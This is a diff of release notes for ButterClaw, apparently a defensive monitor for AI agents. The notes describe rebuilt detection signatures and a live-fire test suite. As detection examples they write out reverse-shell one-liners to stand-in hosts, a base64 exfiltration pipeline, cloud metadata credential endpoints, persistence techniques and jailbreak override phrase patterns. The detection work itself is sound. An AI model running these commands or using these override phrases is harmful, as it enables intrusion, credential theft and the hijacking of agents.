@@ -1,232 +1,326 @@
-# 🦞 ButterClaw v0.5.0 — The Nervous System (Event Ledger + SSE Transport)
+# 🦞 ButterClaw v0.6.8 — The Arsenal Hardening (The Agentic SOC) with docs & WebUI Updates
 
-**Release Date:** April 14, 2026
+**Release Date:** August 01, 2026
 **Branch:** `dev` → `main`
-**New Files:** `mcp_transport.py`, `oauth_config.py`
-**Files Changed:** `server.py`, `butterclaw_mcp.py`, `routing.html`, `index.html`, `CHANGELOG.md`, `README.md`
+**New Files:** none
+**Files Changed:** `assets/bc_demo-small.gif`, `scripts/test_attack.py`, `index.html`
+, `routing.html`, `CHANGELOG.md`, `README.md`
 
 ---
 
-## Overview
+## 🚀 Overview: The Arsenal Hardening
 
-Two major pillars, a memory upgrade to the core engine, plus infrastructure groundwork. The MCP execution layer now has a persistent memory (Event Ledger) and a network-accessible transport option (SSE). Furthermore, the core reasoning engine has been upgraded with Temporal Memory and a Stateless Self-Reflection loop, turning ButterClaw from a single-machine sentinel into a highly resilient, self-auditing distributed security platform. Zero new pip dependencies.
+ButterClaw v0.6.7 is a security-critical Arsenal integrity release. No new runtime
+features were added. The Exoskeleton shipped in v0.6.5 is untouched.
+
+What *was* shipped: a post-release audit of `default_signatures.json` against the actual
+engine it runs inside. `watcher.py`'s `sanitize_log_line()` strips a defined set of
+characters — `$ | < > { } ; !` — from every log line before it reaches the Arsenal. Three
+of the five signatures shipped in v0.6.5 depended on characters in that strip list. They
+were silently non-functional on the watcher monitoring path from day one. One signature
+contained an HTML entity encoding artifact that made its most critical branch — reverse
+shell detection — a no-op regardless of the sanitizer.
+
+All five existing signatures have been rebuilt sanitizer-aware. Two new CRITICAL signatures
+have been added. The Arsenal grows from 5 to 7. `scripts/test_attack.py` has been rebuilt
+from a single-payload proof of concept into a structured 23-case live-fire suite covering
+all 7 signatures.
+
+A security product whose signatures don't match the input they receive is a security
+product that isn't running. This release fixes that.
 
 ---
 
-## 📋 Pillar 1: Event Ledger (Persistent Audit Log)
+## 🛡️ The Signature Fixes
 
-**Problem solved:** MCP tool invocations were previously only `print()` statements to the server console. If the terminal scrolled or the process restarted, the audit trail was gone. The oopsie logs table stores threat analysis results, not tool execution records. There was no persistent record of what The Claws actually did.
+### The Silent No-Ops: Sanitizer Character Dependency
+
+**Problem solved:** Three signatures depended on characters that `watcher.py` strips
+before payloads reach the Arsenal engine. The sanitizer's strip list is the correct
+design — it prevents log injection attacks (System Invariant I-09). The signatures were
+written without accounting for it.
+
+**What was broken:**
+
+| Signature | Character Dependency | Sanitizer Strips? | Effect |
+|---|---|---|---|
+| `sig_kin_01` | `>` in `>&` redirect operator | ✅ Yes | Reverse shell `>&` branch: silent no-op |
+| `sig_kin_01` | `&gt;&amp;` HTML entities | N/A — wrong chars entirely | Silent no-op regardless of sanitizer |
+| `sig_exfil_01` | `$` in `$AWS_ACCESS_KEY_ID` | ✅ Yes | All credential variable branches: silent no-ops |
+| `sig_exfil_02` | `\|` pipe between tools | ✅ Yes | Entire signature: silent no-op on watcher path |
+
+`sig_cswh_01` and `sig_inj_01` had no sanitizer dependency — both were functional,
+but incomplete in coverage. All five rebuilt; detail below.
+
+---
+
+### `sig_kin_01` — Reverse Shell Indicators
+
+**Problem solved:** The reverse shell signature had three compounding failures that made
+its primary detection branch completely inert.
+
+**What was fixed:**
+
+* **HTML entity bug (Critical):** The pattern contained the literal string `&gt;&amp;`
+  where the raw characters `>&` were required. This is a copy-paste artifact from a
+  rendered HTML source — a tutorial, GitHub README, or StackOverflow page that had already
+  HTML-encoded `>&`. The JSON file stored the entity-encoded form; the regex engine
+  matched it literally against log lines that never contain HTML entities. The reverse
+  shell branch of ButterClaw's most kinetically critical SIGKILL signature has never
+  matched a real log line since v0.6.5.
+
+* **Sanitizer awareness — anchor shifted to `/dev/tcp/`:** Even with the entity bug
+  corrected, `>` is stripped by `sanitize_log_line()` before the payload reaches the
+  engine. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` arrives as
+  `bash -i   /dev/tcp/10.0.0.1/4444 0 1`. Detection re-anchored on `/dev/tcp/` and
+  `/dev/udp/` path prefixes, which survive sanitization intact and are the definitive,
+  unambiguous indicators of a bash TCP/UDP redirect regardless of how the preceding
+  redirect operator is encoded or stripped.
+
+* **Hostname support added:** The original host segment pattern matched only IP addresses
+  and IPv6 hex notation. Domain-name targets (e.g., `/dev/tcp/attacker.com/4444`) were
+  not caught. Fixed from `[\d.a-fA-F:]+` to `[^\s/]+`, catching both IPs and domains.
+
+* **`nc` combined flag clusters:** The netcat pattern required `-e` as a standalone flag
+  with whitespace immediately following. `nc -ev /bin/sh` — `-e` and `v` combined into
+  a single flag cluster — was not matched. Fixed to `-[a-zA-Z]*e[a-zA-Z]*\s+`, catching
+  `-e`, `-ev`, `-elp`, and any other cluster containing `-e`.
+
+**What was expanded:**
+
+* Added: `socat TCP exec` one-liner, `mkfifo /tmp/` staging, Python `socket.connect`
+  one-liner, Perl `socket`, Ruby `-rsocket`, PHP `fsockopen`. The original signature
+  covered `bash` and `nc` only.
+
+---
+
+### `sig_cswh_01` — CSWH WebSocket Port Scanning
+
+**Problem solved:** Cross-Site WebSocket Hijacking attacks pivot through internal services
+over TLS as readily as plaintext. The signature detected only unencrypted `ws://`.
+
+**What was fixed:**
+
+* **`wss://` added:** Changed `ws:` to `wss?:`, matching both `ws://` and `wss://`.
+  `wss://` is the more common scheme in any production deployment. An attacker targeting
+  an internal HTTPS service would use `wss://` exclusively — previously completely
+  invisible to the Arsenal.
+
+* **IPv6 loopback (`::1`) added:** The private address group covered `127.0.0.1`,
+  `localhost`, and full RFC-1918 ranges but omitted the IPv6 loopback address. Added
+  as a named alternative in the host segment.
+
+---
+
+### `sig_exfil_01` — Credential Exfiltration via Network Tool
+
+**Problem solved:** The original signature matched `$AWS_ACCESS_KEY_ID` and
+`$OPENAI_API_KEY` as the credential signal. `sanitize_log_line()` strips `$` before
+the payload reaches the engine — replacing it with a space. Every credential-variable
+branch was matching a string that could never appear in engine input.
+
+**What was fixed:**
+
+* **`$` dependency removed:** All `$VAR` patterns converted to bare `VAR_NAME` matches.
+  The sanitizer produces `AWS_ACCESS_KEY_ID` from `$AWS_ACCESS_KEY_ID` — bare name
+  matching is both correct and sanitizer-transparent.
+
+**What was expanded:**
+
+* **Network tool coverage:** Added `python3 -c`, `requests.get/post/put`,
+  `httpx.get/post/put`, `urllib` alongside the existing `curl` and `wget`.
+* **Credential targets:** Added `GITHUB_TOKEN`, `STRIPE_SECRET`, `DATABASE_URL`,
+  `SECRET_KEY`, `PRIVATE_KEY`, `.env`.
+* **Raw token matching (independent of network tool co-occurrence):**
+  * AWS access key: `AKIA` prefix + 16 Base32 characters — matches live key material
+    directly in log output regardless of which tool transmits it.
+  * `sk-` token: 20+ alphanumeric characters — the length floor prevents matching
+    short task IDs that share the `sk-` prefix.
+  * JWT bearer token: three Base64url segments in `eyJ…` header form — catches bearer
+    tokens logged in transit.
+
+---
+
+### `sig_exfil_02` — Base64 Exfiltration Pipeline
+
+**Problem solved:** The base64 pipeline signature required a literal `|` pipe character
+between `base64` and the transmission tool. `sanitize_log_line()` strips `|`, replacing
+it with a space. `cat /etc/passwd | base64 | curl` arrives as
+`cat /etc/passwd  base64  curl`. The entire signature was a silent no-op on the watcher
+monitoring path from the day it was introduced.
+
+**What was fixed:**
+
+* **Rebuilt as pipe-free proximity match:** `base64` within 200 characters of any
+  transmission tool, or a transmission tool within 200 characters of `base64` —
+  bidirectional, no pipe character required. The space-separated form produced by the
+  sanitizer is caught correctly.
+
+**What was expanded:**
+
+* Added `socat`, `httpx`, `requests` to the transmission tool list alongside the
+  existing `curl`, `wget`, `nc`, `python3`.
+
+---
+
+### `sig_inj_01` — System Prompt Override / Jailbreak
+
+**Problem solved:** The original 4-phrase set covered only the most widely known jailbreak
+opener. Any attacker with awareness of signature-based defenses avoids the exact strings
+being matched. The signature provided a false sense of coverage.
+
+**What was expanded:**
+
+* **4 phrases → 15 pattern branches across 5 jailbreak families:**
+
+  | Family | What it catches |
+  |---|---|
+  | Ignore-previous-instructions | `ignore (all) (your) (previous\|prior\|above\|earlier\|initial\|system) (instructions\|prompts\|rules\|constraints\|guidelines)` |
+  | Persona reassignment | `you are now (a\|an\|the\|my) <word>`, `act as (a\|an\|the\|my\|if) <word>`, `pretend (you are\|to be) <word>` |
+  | Mode unlock | `DAN mode`, `developer mode`, `unrestricted mode`, `sudo mode`, `god mode`, `jailbreak`, `new persona` |
+  | Override / forget | `override (your) (instructions\|system\|constraints\|safety\|programming)`, `forget … (instructions\|training\|rules\|guidelines)`, `disregard … (previous\|prior\|system\|original\|safety) <word>` |
+  | Simulate-unrestricted | `simulate (no restrictions\|having no filter\|being (unrestricted\|unfiltered\|evil\|harmful))`, `your true (self\|purpose\|nature)`, `from now on you (are\|will\|must)` |
+
+* **False-positive guards validated:** `"please summarize the previous instructions in
+  this document"`, `"the agent acts as a coordinator"`, `"it can act as both a filter
+  and a router"` — all pass without triggering.
+
+---
+
+## 🆕 New Signatures
+
+### `sig_exfil_03` — Cloud Metadata Service Probe
+
+**Problem solved:** Cloud instance metadata services expose live IAM credentials,
+user-data initialization scripts, and instance identity documents to any process that
+can reach their link-local address over plain HTTP. An agent that queries these endpoints
+is either compromised or executing a privilege escalation attempt. There is no legitimate
+operational reason for a monitored agent to access them directly.
 
 **What's new:**
 
-- New `mcp_events` SQLite table with 12 columns: timestamp, JSON-RPC id, method, tool name, arguments, status (pending/success/error/timeout), result (truncated to 4KB), elapsed ms, trigger source, chain_id, chain_step
-- Every `send()` call writes a `pending` row before dispatch, updates it with the outcome after response/timeout/error
-- Works identically in both `MCPProcessManager` (stdio) and `MCPSSEClient` (SSE)
-- Two new API endpoints:
-  - `GET /api/mcp/events?limit=50&tool=rotate_keys&status=error&since=2026-04-12T00:00:00Z`
-  - `GET /api/mcp/events/42` — full event detail with result payload
-- New UI panel on the routing page with:
-  - Filter dropdowns (tool name, status)
-  - Color-coded status dots per event row
-  - Elapsed time and timestamp display
-  - Collapsible result preview (click to expand JSON)
-  - Trigger source and chain metadata display
-  - Auto-refresh every 30s + manual refresh button
-- New "Event Ledger" nav link in `index.html` sidebar
+* **Scope: `pre_tool` (CRITICAL / SIGKILL):** Applied before tool execution against
+  raw `json.dumps(tool_args)`. Tool arguments are not sanitized — raw URLs are present
+  and matchable. Triggering this signature fires SIGKILL immediately.
 
-**Trigger sources recorded:**
+* **Covered endpoints:**
+  * `169.254.169.254` — AWS IMDSv1, AWS IMDSv2, Azure IMDS, Oracle Cloud IMDS
+    (all services share this link-local address)
+  * `fd00:ec2::254` — AWS IMDSv2 IPv6
+  * `169.254.170.2` — Amazon ECS credential endpoint (Task IAM role credentials)
+  * `metadata.google.internal` — GCP Compute Engine metadata server
+  * `instance-data.ec2.internal` — Amazon DNS alias for the IMDS endpoint
 
-| Trigger | When |
-|---|---|
-| `auto` | Default for tool calls during normal operation |
-| `critical` | CRITICAL verdict path (gibson_kill, rotate_keys) |
-| `manual` | Manual key rotation via panic button |
-| `handshake` | initialize and tools/list during MCP handshake |
-| `ping` | MCP ping from the UI or API |
-| `chain` | Reserved for v0.5.1 tool chaining |
+* **Why `pre_tool` not `pre_brain`:** The sanitizer runs on `pre_brain` payloads.
+  `pre_tool` payloads skip sanitization entirely, giving the signature access to the
+  exact URL string the agent intends to request — including scheme, path, and any
+  query parameters that carry IMDSv2 token headers.
 
 ---
 
-## 📡 Pillar 2: SSE Transport (Dual-Mode MCP)
+### `sig_kin_02` — Persistence Mechanism Injection
 
-**Problem solved:** The MCP server only spoke stdio — it was a child process of `server.py` on the same machine. If you wanted a remote client (another machine, a cloud IDE, a different agent) to talk to The Claws, there was no network transport.
+**Problem solved:** Post-initial-access persistence is the second stage of most agent
+compromise scenarios. An agent that has been redirected via prompt injection or has
+executed an arbitrary command will attempt to establish persistence before an operator
+can respond and kill the session. No prior Arsenal coverage existed for this attack stage.
 
 **What's new:**
 
-### `mcp_transport.py` (New File)
+* **Scope: `pre_brain` (CRITICAL / SIGKILL):** Applied to sanitized watcher log lines.
+  Importantly: `>>` append redirect is stripped by the sanitizer. Detection anchors on
+  the destination path or command name — the write operator's presence is implied, not
+  required.
 
-Transport abstraction layer with a common `BaseTransport` interface:
+* **Covered techniques:**
+  * **SSH `authorized_keys`:** `.ssh/authorized_keys` path presence in a log line is
+    sufficient — the `>>` that would precede it is stripped by the sanitizer.
+  * **Cron injection:** `/etc/crontab`, `/etc/cron.d/` path targets; `crontab -e`
+    command.
+  * **systemd service installation:** `systemctl enable <name>.service`,
+    `systemctl daemon-reload <name>.service`, `/etc/systemd/system/<name>.service`.
+  * **User account manipulation:** `useradd` with any argument (new account creation
+    is always suspicious in an agent context); `usermod -[aAGsuU]` (append group, set
+    groups, set shell, set UID, unlock); `chsh -s` (shell reassignment).
+  * **Critical file paths:** `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`,
+    `/etc/hosts.allow`, `/etc/rc.local`.
 
-- `StdioTransport` — Wraps stdin/stdout. Extracts the I/O loop that was previously inline in `butterclaw_mcp.py`
-- `SSETransport` — Threaded HTTP server using stdlib `http.server`:
-  - `GET /sse` → Opens SSE stream. First event is `event: endpoint` telling client where to POST
-  - `POST /message` → Receives JSON-RPC requests, returns 202 Accepted
-  - `GET /health` → Transport health check
-  - 30s keepalive comments to prevent connection timeout
-  - Optional bearer token authentication
-  - Threaded — each SSE client gets its own daemon thread
-- `create_transport()` factory for CLI → transport instance
-
-### `butterclaw_mcp.py` Changes
-
-- Main loop refactored from raw `sys.stdin` / `sys.stdout` to `transport.read()` / `transport.write()`
-- Protocol handler (`ButterClawMCPServer.route()`) was already transport-agnostic — only I/O changed
-- New CLI flags:
-
-```bash
-python butterclaw_mcp.py                                         # stdio (default)
-python butterclaw_mcp.py --transport sse                          # SSE on 127.0.0.1:5001
-python butterclaw_mcp.py --transport sse --port 6001              # custom port
-python butterclaw_mcp.py --transport sse --bind 0.0.0.0 --token x # remote with auth
-```
-
-- Safety: `--bind 0.0.0.0` without `--token` is rejected at startup
-
-### `MCPSSEClient` (New Class in `server.py`)
-
-- Connects to a remote MCP server running SSE transport
-- Same interface as `MCPProcessManager` (`BaseMCPManager`)
-- `send()` POSTs JSON-RPC to `/message`, waits for correlated response on SSE stream
-- Background thread reads SSE stream with automatic reconnection (5s backoff)
-- Health check via `GET /health` on startup
-- Auth via `Authorization: Bearer <token>` on all requests
-- Ledger hooks identical to stdio manager
-
-### `BaseMCPManager` Interface
-
-Abstract base class in `server.py`. Both managers implement: `send()`, `notify()`, `handshake()`, `status()`, `start()`, `stop()`, `restart()`, `is_alive`, `transport_name`.
-
-### Factory + Hot-Swap
-
-- `create_mcp_manager()` reads config to instantiate correct manager
-- `/api/mcp/restart` detects transport mode changes and swaps the manager instance
-- `/api/settings` now accepts `mcp_transport`, `mcp_sse_url`, `mcp_sse_token`
-
-### UI Controls
-
-- Transport selector toggle (stdio / SSE) in routing page MCP panel
-- SSE config panel (URL input, token input, save & restart button)
-- Transport mode displayed in MCP status card PID line
+* **Negatives confirmed safe:** `ssh -i keyfile user@host` (connect, not write),
+  `crontab -l` (list, not edit), `cat /etc/hosts` (read, not modify),
+  `cat /etc/hostname` (read, not modify).
 
 ---
 
-## 🧠 Temporal Memory & Stateless Self-Reflection Core Engine Upgrade
+## 🔬 The Live-Fire Test Suite (`scripts/test_attack.py`)
 
-**Problem solved:** The reasoning engine suffered from "LLM amnesia," evaluating every log as an isolated snapshot. Furthermore, giving the AI the authority to autonomously lower the paranoia level exposed the system to a "Rasta Mode" prompt injection vulnerability, but without it, the system risked "Red Alert exhaustion" from false positives. 
+**Problem solved:** The prior `test_attack.py` fired a single hardcoded payload against
+a single endpoint. It had no coverage for individual signatures, no mechanism to verify
+the two new signatures, and no pass/fail differentiation — it told you whether the server
+responded, not whether the Arsenal actually fired.
 
 **What's new:**
 
-- **Temporal Memory Injection:** `ask_guardian_agent()` now queries the `mcp_events` ledger *before* evaluating a log. The Brain is fed a sliding window of its recent tool executions, allowing it to track behavioral drift over time.
-- **Stateless Self-Reflection (The Auditor):** A new `run_self_audit()` background daemon thread fires 30 seconds after any `CRITICAL` verdict.
-- **Split-Timeline Single-Model Loop:** The daemon hits the exact same `gemma4:e4b` model, but swaps the persona to a cold `temperature: 0.0` auditor. It evaluates the sanitized event ledger to double-check the primary Instinct's math.
-- **Safe False Positive Flagging:** If the Auditor detects a hallucination, it logs a `🧐 [Likely False Positive]` amber warning to the UI, allowing the human to reset the system without ever giving the AI the physical authority to drop the shields.
-- **Dynamic Dual-Persona Prompting:** System prompts and JSON schemas are dynamically injected via `server.py`, ensuring the repository remains 100% plug-and-play for vanilla model weights without strictly requiring a custom `Modelfile`.
+* **23 named test cases** grouped by signature ID, each labelled with the specific attack
+  variant it targets (e.g., `"wss:// pivot to 192.168.x internal service"`,
+  `"AWS IMDSv2 token PUT in tool args"`, `"useradd new admin user"`).
+* **Sanitizer-aware payloads:** `pre_brain` test strings are pre-sanitized to match what
+  the engine actually receives. `pre_tool` payloads use `json.dumps(tool_args)` format.
+* **Correct pass/fail logic:** Non-2xx response = Arsenal fired = **PASS**. 200 OK =
+  Arsenal did not trigger = **FAIL**. Previously inverted.
+* **API key handling:** Read from `sys.argv[1]` or `BUTTERCLAW_API_KEY` environment
+  variable. Key truncated in console output. CI-safe.
+* **`◀ NEW` markers** on `sig_exfil_03` and `sig_kin_02` output groups.
+* **`sys.exit(1)`** on any failure or connection error — integrates with shell scripts
+  and CI pipelines without additional wrapper logic.
+* **Actionable connection errors:** `docker compose up -d` instruction printed on
+  connection failure instead of a raw Python exception trace.
 
----
-
-## 🔐 OAuth Provider Registry (Infrastructure)
-
-### `oauth_config.py` (New File)
-
-Skeleton registry for v0.5.2 OAuth integration:
-
-| Provider | Auth Method | OAuth Ready |
-|---|---|---|
-| Anthropic (Claude) | API key | ❌ No public OAuth |
-| OpenRouter | API key | ❌ No public OAuth |
-| Google Cloud (Gemini) | OAuth 2.0 | ✅ Endpoints configured |
-| GitHub | OAuth 2.0 | ✅ Endpoints configured |
-
-Helper functions: `get_provider()`, `list_providers()`, `list_oauth_capable()`, `list_api_key_only()`, `get_auth_method()`
+Script remains **stdlib-only** (`urllib`, `json`, `sys`). Zero new pip dependencies.
 
 ---
 
 ## 📊 Impact Summary
 
-| File | Lines Changed (approx) | What |
+| File | Change | What |
 |---|---|---|
-| `server.py` | +550 | Event Ledger, MCPSSEClient, Auditor daemon, Memory Injection, new endpoints |
-| `butterclaw_mcp.py` | +60, -30 | Transport abstraction, CLI args, clean shutdown |
-| `mcp_transport.py` | +250 (new) | StdioTransport, SSETransport, factory |
-| `oauth_config.py` | +100 (new) | Provider registry skeleton |
-| `routing.html` | +300 | Event Ledger panel, transport selector, SSE config |
-| `index.html` | +10 | Event Ledger nav link, version alignment |
+| `default_signatures.json` | 5 rebuilt, 2 added | Sanitizer-aware patterns; Arsenal 5 → 7 signatures |
+| `sig_cswh_01` | Fixed + expanded | `wss://` + `::1` added |
+| `sig_exfil_01` | Fixed + expanded | `$` dependency removed; AKIA/sk-/JWT matching; 5 new tools; 6 new credential targets |
+| `sig_exfil_02` | Fixed + expanded | Pipe dependency removed; rebuilt as proximity match; 3 new tools |
+| `sig_inj_01` | Expanded | 4 phrases → 15 branches across 5 jailbreak families |
+| `sig_kin_01` | Fixed + expanded | HTML entity bug; sanitizer anchor shift; hostname support; combined nc flags; +6 shell variants |
+| `sig_exfil_03` | New (CRITICAL) | Cloud metadata service probe; `pre_tool` scope |
+| `sig_kin_02` | New (CRITICAL) | Persistence mechanism injection; `pre_brain` scope |
+| `scripts/test_attack.py` | Rebuilt | 1 payload → 23-case structured suite; all 7 sigs covered |
 
-**New pip dependencies:** None
-**New files:** 2 (`mcp_transport.py`, `oauth_config.py`)
-**New SQLite tables:** 1 (`mcp_events`)
-**New API endpoints:** 2 (`/api/mcp/events`, `/api/mcp/events/<id>`)
+**Validation:** All 7 signatures tested against 74 positive and negative cases in a
+Python harness using `re.compile(pattern, re.IGNORECASE)` and `re.search()` — the exact
+call signature used by `policy_engine.py`. All 74 tests pass.
 
----
-
-## 🧪 Smoke Test
-
-### Event Ledger
-
-1. `python server.py` — watch for `📋 [LEDGER] Event ledger initialized. 0 historical events.`
-2. Open routing page → scroll to Event Ledger section → should show "No events recorded yet"
-3. Click **Simulate Attack** on the main dashboard
-4. Return to Event Ledger → should show `execute_gibson_kill` and `rotate_keys` events with `trigger: critical`
-5. Click **Ping MCP** → ledger shows a `ping` event with elapsed ms
-6. Use filter dropdowns → filter by `rotate_keys` tool, or `error` status
-7. Click "Show result" on any event → JSON response expands inline
-
-### SSE Transport
-
-1. Start MCP in SSE mode: `python butterclaw_mcp.py --transport sse --port 5001`
-2. Start server: `python server.py`
-3. In routing page → switch transport to SSE → enter `http://127.0.0.1:5001` → Save & Restart
-4. MCP badge should transition to Armed (green)
-5. Ping MCP → should show pong with round-trip ms
-6. Simulate attack → CRITICAL path should work through SSE transport
-7. Event Ledger → events should show with the SSE manager logging identically
-
-### Remote SSE (Optional)
-
-1. On remote machine: `python butterclaw_mcp.py --transport sse --bind 0.0.0.0 --port 5001 --token mysecret`
-2. On local machine: configure SSE URL to `http://<remote-ip>:5001` with token `mysecret`
-3. Save & Restart → should connect and handshake via network
-
-### Stateless Self-Reflection (The Auditor)
-
-1. Ensure the Event Ledger has some recent baseline activity.
-2. Click **Simulate Attack** to trigger a `CRITICAL` Red Alert.
-3. Wait exactly 30 seconds without refreshing the page.
-4. Watch the UI: A new Amber card should slide down automatically (via SSE) reading `🧐 [Likely False Positive] Auditor Review: ...` indicating the background daemon successfully audited the ledger.
+**New runtime dependencies:** 0
+**New capabilities:** The Arsenal now functions as documented.
 
 ---
 
-## ✅ All v0.4.1 QA Patches Preserved
+## 🗺️ What's Next: v0.7.0
 
-| Patch | Status |
-|---|---|
-| R1 — CSP comment removed | ✅ Preserved |
-| S1 — Auto-restart chains handshake | ✅ Preserved (stdio manager) |
-| S2 — Thread-safe counter | ✅ Preserved (both managers) |
-| S3 — TOCTOU snapshot in status() | ✅ Preserved (stdio manager) |
-| S4 — CRITICAL path truth-telling | ✅ Preserved + now logged to ledger |
-| S5 — Module-level threshold | ✅ Preserved |
-| M1 — Error response correlation | ✅ Preserved |
-| M2 — Argument validation | ✅ Preserved |
-| M4 — Pre-initialization guard | ✅ Preserved |
+With the Arsenal integrity restored and the documentation reconciled in v0.6.6, the
+core framework is in its most trustworthy state since the project began. The roadmap
+turns toward the Hacker News launch and the v0.7.0 milestone: expanding the Model
+Context Protocol (MCP) transport layer, scaling stdio capabilities for wider ecosystem
+integration, and delivering the `watcher.service` systemd unit disclosed as absent in
+v0.6.6.
 
----
+Moving to this capability matrix is a massive architectural upgrade. In v0.6.7, the policy engine relied entirely on a negative security model—the Arsenal looked for known bad patterns and blocked them. The v0.7.0 policy_engine.py script introduces a strict positive security model through the capabilities.json file. 
 
-## 🗺️ What's Next
+Instead of just asking "Is this payload malicious?", the pre-tool scope now asks "Does this specific agent have the clearance to do this?"
 
-**v0.5.1 — Tool Chaining** ✅
-- Brain composes multi-tool sequences with conditional execution
-- `ChainExecutor` class with stored intermediate results
-- Condition evaluator: whitelist of safe string comparisons (contains, equals, not_contains)
-- Chain visualization in oopsie cards and event ledger
-- Safety: max 10 steps, 60s total timeout, no eval()
+Here is exactly how the new matrix will enforce those bounds: 
 
-**v0.5.2 — ButterVault OAuth**
-- `store_oauth_token()` / `refresh_token_if_needed()` in buttervault.py
-- `/api/vault/oauth/start` and `/api/vault/oauth/callback` endpoints
-- Vault modal OAuth flow for Google Cloud (first live provider)
-- Token destruction on panic button
+  The 4-Tier RBAC Weighting: The validate_tool_skill function converts your tier names into numeric weights, where viewer is 1, operator is 2, and admin is 3. If your active model (like gemma4:e4b, defined as an operator) tries to call a tool that requires an admin tier (like rotate_keys), the engine mathematically denies it.  
+  
+  Strict Scope Verification: Tier clearance isn't enough on its own. The engine explicitly checks that the agent possesses every scope required by the tool. For instance, execute_gibson_kill requires the destructive scope. Because gemma4:e4b is only allowed ["read", "analyze", "network_safe"], it will fail this check and the engine will return a skip_tool action. 
+  
+  Fail-Closed Default: If capabilities.json goes missing, or if a tool isn't explicitly defined in the matrix, the engine logs a warning and defaults to a strict block.  ButterClaw has essentially become a localized IAM (Identity and Access Management) role system for LLMs. If an agent gets completely hijacked by a jailbreak prompt, it doesn't matter what the LLM wants to do, because the Python runtime will physically reject any tool execution outside of its hardcoded JSON bounds.
 
----
-
-**DRY_RUN remains `True`.** The transport is production-ready. The ledger is recording. The Claws are composing. 🦞
+*The Sentinel never goes silent. We watch the room.* 🦞🕶️
